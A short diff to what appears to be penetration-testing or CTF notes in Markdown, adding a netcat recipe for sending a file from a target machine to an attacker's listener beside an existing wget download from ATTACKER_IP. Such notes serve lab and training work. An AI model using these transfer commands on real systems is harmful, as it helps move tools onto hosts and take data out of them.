@@ -2,15 +2,24 @@
 
 ## Helpers
 
-### Getting files to the target
+### Transfering files between target and attacker
 
-#### Python HTTP server
+#### Python HTTP server. Attacker --> Target
 ```bash
 # Attacker machine, in dir of file
 python3 http.server PORT
 
 # Target machine
 wget ATTACKER_IP:PORT/FILE
+```
+
+#### netcat. Target --> Attacker
+```bash
+# Start listener on attacker
+nc -lnvp PORT > received_file
+
+# Send file over from target
+nc ATTACKER_IP PORT < file_to_send
 ```
 
 ### Stabilizing shells
